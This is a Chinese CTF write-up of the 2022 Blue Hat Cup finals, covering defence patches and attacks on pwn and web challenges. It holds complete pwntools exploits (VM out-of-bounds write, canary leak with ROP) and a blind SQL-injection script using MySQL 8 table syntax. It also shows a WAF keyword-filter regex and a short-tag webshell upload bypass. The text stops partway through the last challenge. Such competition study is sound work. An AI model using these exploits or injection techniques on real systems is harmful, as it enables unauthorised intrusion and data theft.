2022蓝帽杯决赛
=========

![image-20220921222807279](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-f0604a724aaecfe159c7c881662c75dea0610b53.png)

pwn
---

### mvm

#### 分析

实现了一个栈的虚拟机，栈和寄存器之间的数据存取，以及栈的加减乘除等运算。

漏洞点在对寄存器下标检测时用的是**有符号数**，从而造成越界读写（为负数可**越界往前读**，下标为足够大的负数时，乘 8 后，会**溢出**回正数，从而造成越界写）：

![image-20220921172716157](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-805869ef309c33cb3525c524a1f395cd03e1f532.png)

![image-20220921172730509](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-00a488f438dcfc76d4065f76db92e578cba6dc2d.png)

![image-20220921175412406](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-57285424d467f7c6cde204069bc923b09bc3e8ca.png)

#### 防御

以上面的其一举例，将 jle 改成 jbe ，即无符号比较，修复漏洞成功。

![image-20220921172848934](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-8c1f81aa736a0d76a56b57b9a7c7ab66a08a95d3.png)

#### 攻击

利用越界读拿栈上的残留的 libc 基址，塞入栈里，压入 **one\_gadget** 与上述地址的偏移量，减一下，利用越界写写到返回地址处即可。

- **Exp**

```python
from pwn import *

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

elf = ELF('./mvm')
context(arch = elf.arch, os = 'linux',log_level = 'debug')
p = remote("39.105.99.40",16564)
'''
 tel 0x7ffe5a250510-0x20050-0x100 50
'''
size = 0
def push(num):
    global size
    size += 1
    return ('1\n'+str(num)+'\n')

def pop(num):
    global size
    size += 1
    return ('2\n')

def top(RegID):
    global size
    size += 1
    return ('3\n'+str(RegID)+'\n')

def push_reg(RegID):
    global size
    size += 1
    return ('4\n'+str(RegID)+'\n')

def add():
    global size
    size += 1
    return ('5\n')

def sub():
    global size
    size += 1
    return ('6\n')

def div():
    global size
    size += 1
    return ('7\n')

def mul():
    global size
    size += 1
    return ('8\n')

def and_t():
    global size
    size += 1
    return ('9\n')

def or_t():
    global size
    size += 1
    return ('10\n')

def xor_t():
    global size
    size += 1
    return ('11\n')

def print_top():
    global size
    size += 1
    return ('14\n')

def pop_reg(RegID):
    global size
    size += 1
    return ('15\n'+str(RegID)+'\n')

def default():
    global size
    size += 1
    return (p8(0xff)+'\n')

code = push(0x111) + push(0x222) + push(0x333) + push(0x444)
code += push_reg(-0x15-1) + push(0x7ffff7fc16a0-0x7ffff7ebbc81) + sub() + pop_reg(-0x3fffffffffffffff-1+(0x20050/8)+1)
# for i in range(6,100):
#     code += push_reg(1) + pop_reg(1-i)
# code += push_reg(-9)
# code += push(0x4004) + pop_reg(-4)# + push_reg(1) 
code += default()
'''
tel rbp-0x20050-0x100 50
00:0000│     0x7ffffffddc30 —▸ 0x7ffffffddc40 ◂— 0x0
01:0008│     0x7ffffffddc38 ◂— 0x444b2c3b4d3b4e00
02:0010│     0x7ffffffddc40 ◂— 0x0
03:0018│     0x7ffffffddc48 —▸ 0x7ffffffede60 ◂— 0x0
04:0020│     0x7ffffffddc50 ◂— 0x100
05:0028│     0x7ffffffddc58 ◂— 0x0
06:0030│     0x7ffffffddc60 ◂— 0xa /* '\n' */
07:0038│     0x7ffffffddc68 ◂— 0x0
08:0040│     0x7ffffffddc70 ◂— 0xd68 /* 'h\r' */
09:0048│     0x7ffffffddc78 ◂— 0xa /* '\n' */
0a:0050│     0x7ffffffddc80 —▸ 0x7ffff7fc16a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
0b:0058│     0x7ffffffddc88 —▸ 0x555555557008 ◂— 'welcome to vmmmmmm world!'
0c:0060│     0x7ffffffddc90 —▸ 0x555555559020 —▸ 0x7ffff7fc16a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
0d:0068│     0x7ffffffddc98 —▸ 0x7ffff7fc24a0 (_IO_file_jumps) ◂— 0x0
0e:0070│     0x7ffffffddca0 ◂— 0x0
0f:0078│     0x7ffffffddca8 —▸ 0x7ffff7e69013 (_IO_file_overflow+275) ◂— cmp    eax, -1
10:0080│     0x7ffffffddcb0 ◂— 0x19
11:0088│     0x7ffffffddcb8 —▸ 0x7ffff7fc16a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
12:0090│     0x7ffffffddcc0 —▸ 0x555555557008 ◂— 'welcome to vmmmmmm world!'
13:0098│     0x7ffffffddcc8 —▸ 0x7ffff7e5c71a (puts+378) ◂— cmp    eax, -1
14:00a0│     0x7ffffffddcd0 —▸ 0x555555555fc0 ◂— endbr64
15:00a8│     0x7ffffffddcd8 —▸ 0x7fffffffdd80 ◂— 0x0
16:00b0│     0x7ffffffddce0 —▸ 0x555555555140 ◂— endbr64
17:00b8│     0x7ffffffddce8 —▸ 0x7fffffffde70 ◂— 0x1
18:00c0│     0x7ffffffddcf0 ◂— 0x0
19:00c8│     0x7ffffffddcf8 —▸ 0x555555555357 ◂— mov    eax, dword ptr [rbp - 0x2007c]
1a:00d0│ rsp 0x7ffffffddd00 ◂— 0x1100000000
1b:00d8│     0x7ffffffddd08 ◂— 0x11
1c:00e0│     0x7ffffffddd10 ◂— 0x3
1d:00e8│     0x7ffffffddd18 —▸ 0x7ffffffedde0 ◂— 0xf
1e:00f0│     0x7ffffffddd20 ◂— 0x444
1f:00f8│     0x7ffffffddd28 ◂— 0x0
20:0100│     0x7ffffffddd30 ◂— 0x0
21:0108│     0x7ffffffddd38 —▸ 0x7ffff7ebbc7e (execvpe+638) ◂— mov    rdx, r12
22:0110│     0x7ffffffddd40 ◂— 0x0
... ↓        3 skipped
26:0130│     0x7ffffffddd60 ◂— 0x111
27:0138│     0x7ffffffddd68 ◂— 0x222
28:0140│     0x7ffffffddd70 ◂— 0x333
29:0148│     0x7ffffffddd78 ◂— 0x444
2a:0150│     0x7ffffffddd80 —▸ 0x7ffff7ebbc7e (execvpe+638) ◂— mov    rdx, r12
2b:0158│     0x7ffffffddd88 ◂— 0x105a22
2c:0160│     0x7ffffffddd90 ◂— 0x0

pwndbg> tel rbp-0x20050 30
00:0000│  0x7ffffffddd30 ◂— 0x0
... ↓     5 skipped
06:0030│  0x7ffffffddd60 ◂— 0x111
07:0038│  0x7ffffffddd68 ◂— 0x222
08:0040│  0x7ffffffddd70 ◂— 0x333
09:0048│  0x7ffffffddd78 ◂— 0x0
0x7ffffffddcb8 —▸ 0x7ffff7fc16a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
pwndbg> p/x (0x7ffffffddd60-0x7ffffffddcb8)/8
$2 = 0x15
'''

sla("welcome to vmmmmmm world!",str(size))
se(code)

p.interactive()
```

### 杀猪盘

#### 分析

题目去了符号，逆向分析看上去很困难，其实并没有。

漏洞点还是很明显的栈溢出（离 **rbp** **0xa0**，读入 **0x100**）：

#### 防御

俩处 0x100 改为 0xa0 或更小即可。

![image-20220921173735231](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-1bd064e1c89dede6ad5dea55ed09195d531434bb.png)

#### 攻击

虽然开了 canary，但是给的俩次机会，可以第一次读入覆盖掉低字节的 `\x00` ，输出顺带 leak 出 canary，第二次直接劫持控制流。

但是去了符号，应该劫持到哪是必须要考虑的，这里采取的是搜索 `/bin/sh\0` 的交叉应用，找到类似 one\_gadget 的代码：

![image-20220921174005096](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-1296876bb12f4801e255166c3e28af10ff9097f1.png)

但是实际这个是不满足的，需要寻找相关gadget 调一下 rdx 即可：

```c
0x000000000000cb6f : pop r12 ; ret
```

- **Exp**

```python
from pwn import *

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

elf = ELF('./szp2')
context(arch = elf.arch, os = 'linux',log_level = 'debug')
p = remote("39.105.99.40",26218)

sla("1.从头开始",'2')
sla("4.阿刚",'4')
sla("Y","Y")
for i in range(13):
    sl('')
    sleep(0.1)
sla("2. 十分高兴",'2')
for i in range(10):
    sl('')
    sleep(0.1)
sla("2. 向女友表示网络有风险，投资需谨慎。",'1')
sla("账户名",'u'*8)
sla("你的积蓄",str(150000))
sla("充值金额",str(150000))
sl('')
sla("4. 提现",'4')
sla("提现金额",'30000')
for i in range(2):
    sl('')
    sleep(0.1)
sea("你试着给她发短信说道:",'u'*0x99)
sl('')
ru("u"*0x99)
canary = uu64('\0'+rc(7))
lg('canary',canary)
stack = uu64(rc(6))
lg('stack',stack)
sl('')
sea("又发了一条短信",'u'*0x98+p64(canary))
for i in range(2):
    sl('')
    sleep(0.1)

sleep(1.1)
sl('4')
sla("Y","Y")
for i in range(13):
    sl('')
    sleep(0.1)
sla("2. 十分高兴",'2')
for i in range(10):
    sl('')
    sleep(0.1)
sla("2. 向女友表示网络有风险，投资需谨慎。",'1')
sla("账户名",'u'*8)
sla("你的积蓄",str(150000))
sla("充值金额",str(150000))
sl('')
sla("4. 提现",'4')
sla("提现金额",'30000')
for i in range(2):
    sl('')
    sleep(0.1)
# pause()
sea("你试着给她发短信说道:",'u'*0xa8)
sl('')
'''
 b *(0x7ffff7f0a000+0xB649)
 b *(0x7ffff7f0a000+0xB6EE)
'''
LEAK = uu64(ru('\x7f',drop=False)[-6:])
BASE = LEAK - 0xb885
lg('LEAK',LEAK)
lg('BASE',BASE)
sl('')
'''
0x000000000000cf94 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000009cbb : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000018c99 : pop r12 ; pop r13 ; pop r14 ; ret
0x000000000001aa96 : pop r12 ; pop r13 ; ret
0x000000000000cb6f : pop r12 ; ret
0x0000000000009cc2 : pop rdi ; ret
0x00000000000ae61b : pop rdx ; pop rbx ; ret
0x0000000000009bcf : pop rdx ; ret
0x000000000000cf99 : pop rsi ; pop r15 ; pop rbp ; ret
0x0000000000009cc0 : pop rsi ; pop r15 ; ret
0x0000000000018c9e : pop rsi ; ret
'''
sea("又发了一条短信:","u"*0x98+p64(canary)+p64(stack)+p64(0x000000000000cb6f+BASE)+p64(0)+p64(BASE+0xA193E))
sl('')
sl('')

p.interactive()
```

### diff

#### 防御

给了俩文件，diff 文件看了一眼没看出来问题。看看 launcher：

漏洞点在 set\_name 时候的溢出：

![image-20220921174521244](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-734591ba17b3ad687d4610c344aee1beaf2ddc7a.png)

比赛中虽然并没有发现怎么利用的这个漏洞，但是这玩意如果设置文件1则能覆盖到**下一个文件的文件名**，设置文件2可以覆盖**canary上方**存放的几个字节，修完确实是防御成功了。

`patch`

修改read的字节数为 **0x7a** 即可

![image-20220921174617959](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-c938f4406523cc5eccc64581d1eff111414df70b.png)

WEB
---

### 赌怪

#### 防御

解压附件，查看`src\main\java\com\jsh\erp\controller`目录下的`UserController.java`，发现是华夏erp的项目。  
![](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-3da3b96250004cb8d2fe1026ec0540ab7c1eb307.png)  
通过搜索华夏erp漏洞可知存在授权绕过和命令执行漏洞。  
参考: <https://cn-sec.com/archives/387212.html>

修改`LogCostFilter.java`,修复其认证绕过出现的点即可防止后续的命令执行。

![](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-3d3588c16d223a4ff3ccd6e22969613c2557bd54.png)  
patch如上，即对传入的所有文件进行认证，避免绕过。

### simple-fish

#### 防御

拿到源码之后扫描了一遍都是一些`sql注入`和`XSS`的漏洞可能存在, 并没有发现文件上传和RCE的漏洞点,

![image-20220921172752074](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-f3eb995d62361a42bb90ef890b281d9add07c0e2.png)

之后我自己逐个源码看完之后也确定了没有命令执行的点, 最后就是把Fix的目标定在了sql注入上, 在目录被多次包含的`db.php`引起了我的注意, 因为它不仅被多次包含, 而且里面会对参数进行waf检测,所以就将Fix点放在了这个waf函数上

```php
<?php

$dbms="mysql";
$host = "127.0.0.1";
$username = "root";
$password = "root";
$dbName = "fish";
$conn=new PDO("$dbms:host=$host;dbname=$dbName", $username, $password);
function waf($s){
  if (preg_match("/select|flag|union|\\\\$|\'|\"|--|#|\\0|into|alert|img|prompt|set/is",$s)||strlen($s)>1000){
    header("Location: /");
    die();
  }
}

foreach ($_GET as $key => $value) {
    waf($value);
}

foreach ($_POST as $key => $value) {
    waf($value);
}

foreach ($_SERVER as $key => $value) {
    waf($value);
}

?>
```

起初我的注意力全在`login.php`上,

```php
<?php
include("db.php");

if(isset($_POST["u"])){
    $username = $_POST["u"];
    $password = $_POST["p"];
    $ip = $_SERVER["REMOTE_ADDR"];
    $time = time();
    $ua = $_SERVER["HTTP_USER_AGENT"];
    $conn->query("insert into data(username,password,ip,time,ua) values (\"$username\",\"$password\",\"$ip\",\"$time\",\"$ua\");");
}

?>
```

但是因为上面的waf过滤了`'`,`"`并且不允许以`\`结尾所以我实在想不到其他的注入方法了, 因此最后我Fix的方法就是对`waf函数`的过滤进一步加强, 添加了`\*|\/|\n| |`这几个过滤就过了, 不过感觉主要应该是过滤了空格歪打正着了吧,因为后面继续审源码才发现一个漏洞注入点是基于`Mysql8.x`的, 不过这里过滤空格能成功应该就是因为check的payload中并没有进行一些语句执行的替换保留了空格从而过滤了语句完成了防御

修正之后的waf函数如下:

```php
function waf($s){
  if (preg_match("/select|flag|union|\\\\$|\'|\"|--|#|\\0|into|alert|img|prompt|set|-|#|\*|\/|\n| |\t/is",$s)||strlen($s)>1000){
    header("Location: /");
    die();
  }
}
```

#### 攻击

在下载的附件中可以看到有一个账户`admin/25ab1e918ecafc97687acffa220f692b`

![image-20220921171951724](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-545e55f20c9a1f8d998d262443c39ef9d8ba3a8d.png)

拿这个密码到[MD5解密网站](https://pmd5.com/)进行解密一下,可以拿到密码`hardpass`

![image-20220921172054591](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-b87f26eebb0c1fb9f2b11024b8fa46255214c46f.png)

同时从目录附件中可以拿到目录结构

![image-20220921172329082](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-e7feb1f5f3bb22190cf9180a53f1d3a9cd41746a.png)

一开始的时候因为题目中的代码都将显示的页面定义为`404 NotFound`的样式所以导致我对这个目录是否真的存在一直心存疑惑,以为题目中的后台目录是另一个,一直在想怎么才能拿到目录, 但是最后通过访问`/eec2d26be2fd5a8075d541425d7b0621/layui/layui.js`打消了我的疑虑

![image-20220921172532685](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-f4d11b60102b13933dbecd0cd74d3613da20cb3c.png)

从这里开始我们就可以看`eec2d26be2fd5a8075d541425d7b0621`目录下面的文件代码了,

这时候就用到了上面拿到的账号密码`admin/hardpass`

访问`/eec2d26be2fd5a8075d541425d7b0621/login.php`进行登录,但是需要注意,这里并没有登录界面的接口,我们要直接传入参数即可

![image-20220921174749840](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-9c8f799c5433b4e19d6da10ded624fccb3d22f9b.png)

```php
<?php
error_reporting(0);
http_response_code(404);
?>


<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.51 (Win64) PHP/7.4.26 Server at <?php echo $_SERVER["HTTP_HOST"];?> Port 80</address>

<form action="login.php" method="post" style="visibility: ;">
    <input name="u"><br>
    <input type="password" name="p"><br>
    <button type="submit">登录</button>
</form>

</body></html>

<?php
include("../db.php");
session_start();
if(isset($_POST["u"])){
    $username = $_POST["u"];
    $password = $_POST["p"];
    $ip = $_SERVER["REMOTE_ADDR"];
    $time = time();
    $ua = $_SERVER["HTTP_USER_AGENT"];

    $conn->query("insert into login(username,password,ip,time,ua) values (\"$username\",\"$password\",\"$ip\",\"$time\",\"$ua\");");

    $sql="select password from user where username=\"$username\";";
    foreach ($conn->query($sql) as $user){
        if ($user["password"] === md5($password)){
            $_SESSION["username"]="admin";
            echo "<script language=javascript>window.location.href=\"index.php\"</script>";
    }}
}

?>

```

按照源码传入账号密码`u=admin&p=hardpass`

之后就会自动跳转到后台的界面了

![image-20220921174931416](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-14560cc217b45d96c8723bcd12b4235f46a87a46.png)

之后我们再回到`eec2d26be2fd5a8075d541425d7b0621`目录下的源码,发现在`data.php`中看到了注入点:

![image-20220921175115426](https://shs3.b.qianxin.com/attack_forum/attach-3dea37cad4e202ecad55f.png)

```php
<?php 
include("../db.php");
header('Content-Type:text/json;charset=utf-8');
session_start();

if($_SESSION["username"] !== "admin"){
  header("Location: login.php");
}
$sql ="desc `fish`.`$_GET[m]`;";
$conn->query($sql);

$sql = "select * from `fish`.$_GET[m]";
$data = [];
foreach ($conn->query($sql) as $key) {
array_push($data,["id" => $key["id"],"username"=> $key["username"],"password" => $key["password"],"ip"=> $key["ip"],"time"=> date("Y-m-d H:i:s",$key["time"]),"ua" => $key["ua"]]);
}

$page = intval($_GET['page'])>0?intval($_GET['page']):1;
$limit = intval($_GET['limit']);
$count = count($data);
$data = array_slice($data,($page-1)*$limit,$limit);

$json = ["code" => 0,"msg" => "","count" => $count,"data" => $data];

echo json_encode($json);
```

这个注入点是可以使用的, 因为源码的`waf`对我们的过滤几乎可以忽略(主要就是绿了`select`,直接就想到上周六打第五空间的时候遇到的mysql8,x使用table注入了,后面使用`version()>7`测试了一下确实如此), 我们访问`数据管理`模块就可以看到对`data.php`发出的请求

![image-20220921175402621](https://shs3.b.qianxin.com/attack_forum/attach-3dea37cad4e202ecad55f.png)

`m`为data,表示默认是输出`fish.dada`的全部数据,我们在后面加个where判断就可以构造出根据回显长度判断的注入语句了

注意: 这里输出的`data.php`是我们在钓鱼登录界面的登录记录,所以我们要有登录数据才行, 不过其实我们也可以直接使用`m=user`

![image-20220921175709621](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-12b52cbb24de10775b2ba2c1871ef3004cb4d66e.png)

![image-20220921175752059](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-8e54677bf3e15ab2763de1e112697d4c8d5f2e65.png)

下面构造如下脚本:

```python
import requests

def makehex(text):
    rt="0x"
    for i in text:
        t=str(hex(ord(i)))
        rt+=t[2::]
    return rt
def getDatabase(mysqlline):  # 获取数据库名
    ans = ''
    session=requests.session()
    session.post(url+"login.php", data={"u": "admin", "p": "hardpass"})
    for i in range(1, 1000):
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            # sql = f"(0x646566,{makehex('fish')},{makehex('F5fl11A6g99')},%s,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,10,21,22)>(table information_schema.columns limit {mysqlline},1)" % makehex(ans + chr(mid))
            # 先是注出全部的数据库,发现只有一个fish数据库,之后通过行数和字段数逐个微调注入得到表名字段名,最后确定falg在fish.F5fl11A6g99表的F511LAAGG字段,这个表只有两个字段,第一个是id,第二个是flag的字段,所以构造得到如下语句
            sql = f"({mysqlline+1},%s)>(table fish.F5fl11A6g99 limit {mysqlline},1)" % makehex(ans + chr(mid))

            sql = f"where ({sql})"
            # print(sql)
            res = session.post(url + f"data.php?&page=1&limit=10&m=login {sql}",cookies={"PHPSESSID": "v81or11tusuhgflcskd9t6rqtv"})
            # print(res.text)

            if '{"code":0,"msg":"","count":0,"data":[]}' != res.text:#语句为真时的判断语句
                high = mid
            else:
                low = mid + 1
            mid = (low + high) // 2
        if mid <= 32 or mid >= 127:
            break
        ans += chr(mid - 1)
        print("executeEnd is -> " + ans)
    print("executeEnd is -> " + ans[:-1:]+chr(ord(ans[-1])+1))
    return ans[:-1:]+chr(ord(ans[-1])+1)

url = "http://eci-2zeh1wsl8upy70thgyhk.cloudeci1.ichunqiu.com/eec2d26be2fd5a8075d541425d7b0621/"
# tables-> 328
# columns共有3515个数据
# fish.F5fl11A6g99.F511LAAGG
# F5fl11A6g99表中2个字段id,F511LAAGG
for i in range(20):
    print(i)
    try:
        print(i, getDatabase(i))
    except:
        pass
```

![image-20220921180927231](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-e7d6559d2ea8dd157cd5bd06451072ca700b3b8a.png)

跑脚本拿到flag(还需要转一下小写)

### 安全的系统

#### 防御

拿到源码还是直接扫一下,可以看到就两个点,还都是在一个文件`manage.php`

![image-20220921181426543](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-98939b1325dfa14dfe0ce6131d03e8e61c242f51.png)

源码如下:

```php
<?php
include_once "config.php";
if ($_SESSION['username']) {
    $sql = "SELECT * FROM users WHERE username=? LIMIT 1";
    $stmt = $dbh->prepare($sql);
    $stmt->execute(array($_SESSION['username']));
    $data = $stmt->fetchAll(PDO::FETCH_ASSOC);
    $role = $data[0]['role'];
    if ($role === '0') {
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            if ($_POST['submit1']) {
                $filename = $_FILES['file']['name'];
                $filename = str_replace("..","",$filename);
                $filename = str_replace("ht","no",$filename);
                $url = "img/".$filename;
                if (analyse($filename, file_get_contents($_FILES['file']['tmp_name'])) && $_POST['username'] && $_POST['info'] && $_POST['name'] && $_POST['worktime'] && $_POST['special'] && $_POST['position'] && $_POST['password'] && $_POST['idcard'] && $_POST['phone']) {
            move_uploaded_file($_FILES['file']['tmp_name'], $url);
//            Fix修改:file_put_contents($url,str_replace("<?","",file_get_contents($_FILES['file']['tmp_name'])));
            $stmt->execute(array($_POST['username']));
            if (!empty($stmt->fetchAll(PDO::FETCH_ASSOC))) die("repeat user!");
                    $sql = "INSERT INTO doctors (`username`,`info`,`worktime`,`url`,`special`,`position`,`name`) VALUES (?, ?, ?, ?, ?, ?, ?)";
                    $stmt = $dbh->prepare($sql);
                    $stmt->execute(array($_POST['username'], $_POST['info'], $_POST['worktime'], $url, $_POST['special'], $_POST['position'], $_POST['name']));
                    $data = $stmt->fetchAll(PDO::FETCH_ASSOC);
                    $sql = "INSERT INTO users (`username`,`password`,`role`,`phone`,`idcard`,`name`) values(?, ?, '1', ?, ?, ?)";
                    $stmt = $dbh->prepare($sql);
                    $stmt->execute(array($_POST['username'], $_POST['password'], $_POST['phone'], $_POST['idcard'], $_POST['name']));
                    echo "医生信息插入成功！";
                } else {
                    die("信息不全或检测到webshell");
                }
            } else if ($_POST['submit2']) {
                $username = $_POST['username'];
                $newtime = $_POST['newtime'];
                if ($username && $newtime) {
                    $sql = "UPDATE doctors SET worktime=? WHERE username=?";
                    $stmt = $dbh->prepare($sql);
                    $stmt->execute(array($newtime, $username));
                    $data = $stmt->fetchAll(PDO::FETCH_ASSOC);
                    echo "工作时间更改成功";
                } else {
                    die("信息不全");
                }
            } else {
                die("???");
            }

        } else {
            echo file_get_contents("manage.html");
        }
    } else {
        header("Location: /login.html");
    }
}

```

虽然但是, 这里只查到了这一个漏洞点, 一开始我是通过修改分析检测上传文件是否为shell的`analyse`函数,添加里面的过滤,但是结果全都被冲翻了没啥用, 最后改了几次最终我Fix的方法就是直接将上传文件中phpshell必有的`<?`直接给删了,最后就Fix修复成功了

#### 攻击(0解题未出,写一些思路)

这个题目使用到的insert注入在我翻阅了官方手册之后发现一些挺有趣的语句可以看一下

![image-20220921182205946](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-137374bc23c728421ec35f8426ef7b6221e0317d.png)

这个题目我纠结了很久,一开始因为AWDP分数刷一轮少一轮,所以审源码的时候比较浮躁,所以错过了一些关键的点

先来看一下,目录结构如下

![image-20220921183658847](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-f991524070ec0301e212a84c00adf5e48c0ca321.png)

在这里就没什么waf的过滤函数了, 全程几乎可以说不管传什么一路躺平, 然而...这并没有什么用,因为去阿奴吧代码执行的`sql`查询语句几乎都是使用`prepare`预编译语句, 所以基本没能注入的地方,查询和插入数据的时候执行的语句大多跟下面`login.php`的代码差不多

```php
<?php
include_once "config.php";

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = file_get_contents("php://input");
    $json_data = json_decode($data);
    $username = $json_data->username;
    $passwd = $json_data->passwd;
    $sql = "SELECT * FROM users WHERE username=:name LIMIT 1";
    $stmt = $dbh->prepare($sql);
    $stmt->bindParam(':name', $username);
    $stmt->execute();
    $data = $stmt->fetchAll(PDO::FETCH_ASSOC);
    header("Content-Type: application/json");
    if (empty($data)) {
        die('{"code":3}');
    }
    $sql_password = $data[0]["password"];
    $phone = $data[0]["phone"];
    if ($sql_password === $passwd) {
        $_SESSION['username'] = $username;
        $_SESSION['phone'] = $phone;
        $role = $data[0]["role"];
        echo '{"code":'.$role.'}';
    } else {
        echo '{"code":3}';
    }

} else {
    header("Location: /login.html");
}
```

那么了解了代码的一个大概情况之后就需要寻找漏洞利用的地方了,

我们回到在**修复**中扫描检测出有恶意代码的`manage.php`,看一下想要触发文件上传的漏洞需要哪些条件

```php
<?php
include_once "config.php";
if ($_SESSION['username']) {
    $sql = "SELECT * FROM users WHERE username=? LIMIT 1";
    $stmt = $dbh->prepare($sql);
    $stmt->execute(array($_SESSION['username']));
    $data = $stmt->fetchAll(PDO::FETCH_ASSOC);
    $role = $data[0]['role'];
    if ($role === '0') {
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            if ($_POST['submit1']) {
                $filename = $_FILES['file']['name'];
                $filename = str_replace("..","",$filename);
                $filename = str_replace("ht","no",$filename);
                $url = "img/".$filename;
                if (analyse($filename, file_get_contents($_FILES['file']['tmp_name'])) && $_POST['username'] && $_POST['info'] && $_POST['name'] && $_POST['worktime'] && $_POST['special'] && $_POST['position'] && $_POST['password'] && $_POST['idcard'] && $_POST['phone']) {
            move_uploaded_file($_FILES['file']['tmp_name'], $url);
     .....其他非关键的代码,在上面Fix部分有,就不全复制占用地方了           
```

从代码中我们可以看到直接将上传的临时文件直接转移到了`$url`中,而`$url="img/".$_FILES['file']['name']`(其中的临时文件名中的`..`被删除,`ht`被替换为了`no`)想要走到代码中执行需要满足5个`if`判断:

1. `$_SESSION['username']`这个需要我们登录一个用户账号
2. `$role === '0'`这个要求是我们需要满足的重点,因为我们在`register`申请的账号默认`role`字段值为`2`, 所以这就意味着我们需要再找一个注入点将一个`role=0`的用户插入到数据库中,或者拿到一个原始数据库中`role=0`的用户
3. `$_SERVER['REQUEST_METHOD'] == 'POST'`要求使用`POST`方式传参
4. `analyse($filename, file_get_contents($_FILES['file']['tmp_name'])`这个`analyse`函数是在`config.php`中定义的,大概就是正则过滤几个webshell的格式,下面另外展开看看这个正则
5. `$_POST['username'] && $_POST['info'] && $_POST['name'] && $_POST['worktime'] && $_POST['special'] && $_POST['position'] && $_POST['password'] && $_POST['idcard'] && $_POST['phone']`就是要求传输的`POST`数据中有这几个变量,

对我们来说满足`1`,`3`,`4`,`5`对我们来说都是很容易的,主要是第`2`点的身份验证对我们来说比较麻烦

先来看一下第`4`个条件中的`analyse`,

```php
<?php
session_start();
$dbh = new PDO('mysql:host=127.0.0.1;dbname=hospital', 'root', 'root123');
function analyse($filename, $data) {
    global $dbh;
    $filehash = md5($data);
    $sql = "SELECT * FROM files where hash=:hash";
    $stmt = $dbh->prepare($sql);
    $stmt->bindParam(':hash', $filehash);
    $stmt->execute();
    $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
    if (empty($result)) {
        $sql = "INSERT INTO files(`hash`, `shell`) VALUES (?,?)";
        $stmt = $dbh->prepare($sql);
        if (preg_match("/(<\?php\s)|(<\?=)/i", $data)) {
            $stmt->execute(array($filehash, 'yes'));
            return false;
        } else {
            $stmt->execute(array($filehash, 'no'));
            return true;
        }
    } else {
        if ($result[0]['shell'] === 'yes') {
            return false;
        } else {
            return true;
        }
    }
}
```

![image-20220921205930191](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-9a03ca4b6833ab26d8a63f0c0346feaffecf1456.png)

看到就是过滤了`<?=`和`<?php`,这个对于默认的短标签来说可以直接使用`<? echo phpinfo();?>`的方式绕过即可(然而并没有解析,继续往下看)

那么到这里就只剩`role=0`这一个条件了,下面看看是怎么解决的

之前说到在源码中几乎全部的`sql`执行语句都是使用`prepare`去进行预加载的, 所以就导致了后面装入的内容全都不会注入到语句里面而是作为一个变量,大概可以看作是做了`0x`格式的16进制

但是在注册的`register.php`中注册的函数的插入语句却出现了一个唯一的例外

```php
<?php
include_once "config.php";
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = file_get_contents("php://input");
    $json_data = json_decode($data);
    $name = $json_data->name;
    $idcard = $json_data->idcard;
    $phone = $json_data->phone;
    $username = $json_data->username;
    $password = $json_data->password;
    $sql = "SELECT * FROM users WHERE username=?";
    $stmt = $dbh->prepare($sql);
    $stmt->execute(array($username));
    if (!empty($stmt->fetchAll(PDO::FETCH_ASSOC))){
        http_response_code(403);
    } else {
        $sql = "SELECT count(*) FROM users";
        $result = $dbh->query($sql);
        $data = $result->fetchAll(PDO::FETCH_ASSOC);
        $count = $data[0]["count(*)"];

